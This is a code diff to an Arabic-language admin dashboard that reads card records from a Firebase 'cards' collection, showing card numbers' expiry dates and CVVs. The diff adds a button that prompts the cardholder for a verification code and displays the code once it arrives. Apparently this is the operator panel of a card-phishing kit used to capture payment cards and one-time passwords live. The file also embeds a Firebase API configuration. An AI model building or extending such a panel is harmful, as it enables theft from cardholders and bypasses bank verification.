@@ -33,8 +33,18 @@
         .badge-master { background: #fff7ed; color: #9a3412; }
         .badge-mada { background: #f0fdf4; color: #166534; }
         
+        .status-pending { color: #f59e0b; font-weight: bold; }
+        .status-success { color: #10b981; font-weight: bold; }
+        .status-error { color: #ef4444; font-weight: bold; }
+        .status-otp_required { color: #8b5cf6; font-weight: bold; }
+        .status-otp_sent { color: #3b82f6; font-weight: bold; }
+        
         .delete-btn { color: #ef4444; border: none; background: none; cursor: pointer; font-size: 18px; }
         .loader { text-align: center; padding: 40px; font-size: 18px; color: var(--primary); }
+        
+        .action-buttons { display: flex; gap: 5px; }
+        .action-btn { background: none; border: none; cursor: pointer; font-size: 16px; padding: 5px; border-radius: 4px; }
+        .action-btn:hover { background-color: #f3f4f6; }
     </style>
 </head>
 <body>
@@ -79,13 +89,13 @@
     import { getFirestore, collection, getDocs, deleteDoc, doc, query, orderBy, updateDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
 
     const firebaseConfig = {
-   apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
-    authDomain: "vasa-a14ca.firebaseapp.com",
-    projectId: "vasa-a14ca",
-    storageBucket: "vasa-a14ca.firebasestorage.app",
-    messagingSenderId: "1083668938512",
-    appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
-    measurementId: "G-1ESJ0J0TZW"
+        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
+        authDomain: "vasa-a14ca.firebaseapp.com",
+        projectId: "vasa-a14ca",
+        storageBucket: "vasa-a14ca.firebasestorage.app",
+        messagingSenderId: "1083668938512",
+        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
+        measurementId: "G-1ESJ0J0TZW"
     };
 
     const app = initializeApp(firebaseConfig);
@@ -111,6 +121,14 @@
                 stats[data.cardType]++;
 
                 const date = data.createdAt ? data.createdAt.toDate().toLocaleString('ar-EG') : 'غير متوفر';
+                
+                // تحديد اسم الحالة
+                let statusText = data.status || 'قيد الانتظار';
+                let statusClass = 'status-' + (data.status || 'pending');
+                
+                if (data.status === 'otp_sent' && data.otp) {
+                    statusText = `<b style="color:blue;">وصل الكود: ${data.otp}</b>`;
+                }
 
                 const row = `
                     <tr id="row-${docSnap.id}">
@@ -120,11 +138,25 @@
                         <td>${data.expiryDate}</td>
                         <td>${data.cvv}</td>
                         <td style="font-size: 12px; color: #666;">${date}</td>
-                        <td id="status-${docSnap.id}">${data.status || 'قيد الانتظار'}</td>
+                        <td id="status-${docSnap.id}" class="${statusClass}">${statusText}</td>
                         <td>
-                            <button onclick="updateStatus('${docSnap.id}', 'success')" style="color:green; border:none; background:none; cursor:pointer;"><i class="fa-solid fa-check"></i></button>
-                            <button onclick="updateStatus('${docSnap.id}', 'error')" style="color:orange; border:none; background:none; cursor:pointer;"><i class="fa-solid fa-xmark"></i></button>
-                            <button class="delete-btn" onclick="deleteCard('${docSnap.id}')"><i class="fa-solid fa-trash-can"></i></button>
+                            <div class="action-buttons">
+                                <button onclick="updateStatus('${docSnap.id}', 'success')" class="action-btn" style="color:green;" title="قبول">
+                                    <i class="fa-solid fa-check"></i>
+                                </button>
+                                
+                                <button onclick="updateStatus('${docSnap.id}', 'otp_required')" class="action-btn" style="color:#e1ad01;" title="طلب كود التحقق">
+                                    <i class="fa-solid fa-key"></i>
+                                </button>
+                                
+                                <button onclick="updateStatus('${docSnap.id}', 'error')" class="action-btn" style="color:orange;" title="رفض">
+                                    <i class="fa-solid fa-xmark"></i>
+                                </button>
+                                
+                                <button onclick="deleteCard('${docSnap.id}')" class="action-btn delete-btn" title="حذف">
+                                    <i class="fa-solid fa-trash-can"></i>
+                                </button>
+                            </div>
                         </td>
                     </tr>
                 `;
@@ -164,10 +196,23 @@
     window.updateStatus = async (id, newStatus) => {
         try {
             await updateDoc(doc(db, "cards", id), { status: newStatus });
-            const label = newStatus === 'success' ? 'ناجح' : (newStatus === 'error' ? 'فشل' : newStatus);
+            
             const el = document.getElementById(`status-${id}`);
-            if (el) el.innerText = label;
-            alert("تم تحديث الحالة للمستخدم");
+            if (el) {
+                el.className = 'status-' + newStatus;
+                
+                if (newStatus === 'success') {
+                    el.innerText = 'ناجح';
+                } else if (newStatus === 'error') {
+                    el.innerText = 'فشل';
+                } else if (newStatus === 'otp_required') {
+                    el.innerText = 'مطلوب كود تحقق';
+                } else {
+                    el.innerText = newStatus;
+                }
+            }
+            
+            alert("تم تحديث الحالة بنجاح");
         } catch (e) {
             alert("خطأ في التحديث: " + (e.message || e));
         }
